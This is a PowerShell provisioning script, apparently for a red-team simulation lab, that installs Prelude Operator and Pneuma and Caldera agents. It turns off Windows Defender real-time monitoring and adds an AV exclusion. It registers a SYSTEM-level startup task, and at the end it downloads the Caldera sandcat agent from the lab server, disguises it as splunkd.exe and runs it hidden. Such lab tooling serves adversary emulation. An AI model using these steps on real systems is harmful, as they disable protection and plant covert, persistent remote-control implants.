
# Set logfile and function for writing logfile
$logfile = "C:\Terraform\prelude_log.log"
Function lwrite {
    Param ([string]$logstring)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logstring = "$timestamp $logstring"
    Add-Content $logfile -value $logstring
}
lwrite("Starting prelude.ps1")

# Download Prelude Operator for Windows 
if (Test-Path -Path "C:\tools") {
  lwrite("C:\tools exists")
} else {
  lwrite("Creating C:\tools")
  New-Item -Path "C:\tools" -ItemType Directory
}

if (Test-Path -Path "C:\tools\prelude") {
  lwrite("C:\tools\prelude exists")
} else {
  lwrite("Creating C:\tools\prelude")
  New-Item -Path "C:\tools\prelude" -ItemType Directory
}

# Turn off Defender realtime protection so tools can download properly
Set-MpPreference -DisableRealtimeMonitoring $true
# Set AV exclusion path so red team tools can run 
Set-MpPreference -ExclusionPath "C:\Tools" 

# Download Operator 
$MaxAttempts = 5
$TimeoutSeconds = 30
$Attempt = 0

$object_url = "https://" + "${s3_bucket}" + ".s3." + "${region}" + ".amazonaws.com/" + "${filename}"
$outfile = "C:\tools\prelude\" + "${filename}"
$MaxAttempts = 5
$TimeoutSeconds = 30
$Attempt = 0
lwrite("Going to download from S3 bucket: ${s3_bucket}")
lwrite("object url: $object_url")

if (Test-Path -Path $outfile) {
  lwrite("$outfile exists")
} else {
  while ($Attempt -lt $MaxAttempts) {
    $Attempt += 1
    lwrite("Attempt: $Attempt")
    try {
        Invoke-WebRequest -Uri "$object_url" -OutFile $outfile -TimeoutSec $TimeoutSeconds
        lwrite("Successful")
        break
    } catch {
        if ($_.Exception.GetType().Name -eq "WebException" -and $_.Exception.Status -eq "Timeout") {
            lwrite("Connection timed out. Retrying...")
        } else {
            lwrite("An unexpected error occurred:")
            lwrite($_.Exception.Message)
            break
        }
    }
  }
  if ($Attempt -eq $MaxAttempts) {
    Write-Host "Reached maximum number of attempts. Continuing..."
  }
}


lwrite("Installing prelude Desktop UI client")
& "$outfile" /S

# install pneuma-windows
# Wait for redirector on bas server to be ready
# Loop to check if redirector port 2323 is open
$port = 2323 
$server = "${bas_server}" 
$timeout = 1000

function Test-Port {
    param ($server, $port, $timeout)
    $tcpClient = New-Object System.Net.Sockets.TcpClient
    $connect = $tcpClient.BeginConnect($server, $port, $null, $null)
    $success = $connect.AsyncWaitHandle.WaitOne($timeout, $false)

    if ($success) {
        $tcpClient.EndConnect($connect)
        return $true
    } else {
        $tcpClient.Close()
        return $false
    }
}

do {
    $result = Test-Port -server $server -port $port -timeout $timeout

    if (-not $result) {
        lwrite("Port $port on $server is not open. Retrying...")
        Start-Sleep -Seconds 30 
    }

} while (-not $result)

# Download prelude Pneuma from headless bas server running Operator
$object_url = "http://${bas_server}:3391/payloads/pneuma/v1.7/pneuma-windows.exe"
$outfile = "C:\terraform\pneuma-windows.exe"
$MaxAttempts = 5
$TimeoutSeconds = 30
$Attempt = 0
lwrite("Going to download from url: $object_url")

if (Test-Path -Path $outfile) {
  lwrite("$outfile exists")
} else {
  while ($Attempt -lt $MaxAttempts) {
    $Attempt += 1
    lwrite("Attempt: $Attempt")
    try {
        Invoke-WebRequest -Uri "$object_url" -OutFile $outfile -TimeoutSec $TimeoutSeconds
        lwrite("Successful")
        break
    } catch {
        if ($_.Exception.GetType().Name -eq "WebException" -and $_.Exception.Status -eq "Timeout") {
            lwrite("Connection timed out. Retrying...")
        } else {
            lwrite("An unexpected error occurred:")
            lwrite($_.Exception.Message)
            break
        }
    }
  }
  if ($Attempt -eq $MaxAttempts) {
    Write-Host "Reached maximum number of attempts. Continuing..."
  }
}
# Finished Download of pneuma-windows.exe 
lwrite("Downloaded pneuma windows")

# Scheduled task for system bootup trigger
lwrite("Setting scheduled task for pneuma windows")
$TaskName = "pneuma-windows"
$ExePath = "C:\terraform\pneuma-agent.exe"
$Arguments = "-name $env:HOSTNAME -address ${bas_server}:2323"
$User = "SYSTEM"
$TriggerType = "AtStartup"

# Create trigger 
$Trigger = New-ScheduledTaskTrigger -AtStartup

# Create action
$Action = New-ScheduledTaskAction -Execute $ExePath -Argument $Arguments

# Register scheduled task
Register-ScheduledTask -TaskName $TaskName -Trigger $Trigger -User $User -Action $Action -RunLevel Highest -Force

# Start the pneuma agent to connect to Operator headless on bas server
lwrite("Start the pneuma agent")
Start-Process -FilePath "C:\terraform\pneuma-windows.exe" -ArgumentList "-name $env:COMPUTERNAME -address ${bas_server}:2323"

# Caldera agent install
lwrite("Install caldera agent")
# Loop to check if caldera port is open
$port = "${caldera_port}" 
$server = "${bas_server}"
$timeout = 1000

do {
    $result = Test-Port -server $server -port $port -timeout $timeout

    if (-not $result) {
        lwrite("Port $port on $server is not open. Retrying...")
        Start-Sleep -Seconds 30
    }

} while (-not $result)

# Run the Caldera sandcat agent
$server="http://${bas_server}:9999";
$url="$server/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$data=$wc.DownloadData($url);
get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;

lwrite("End of prelude.ps1")
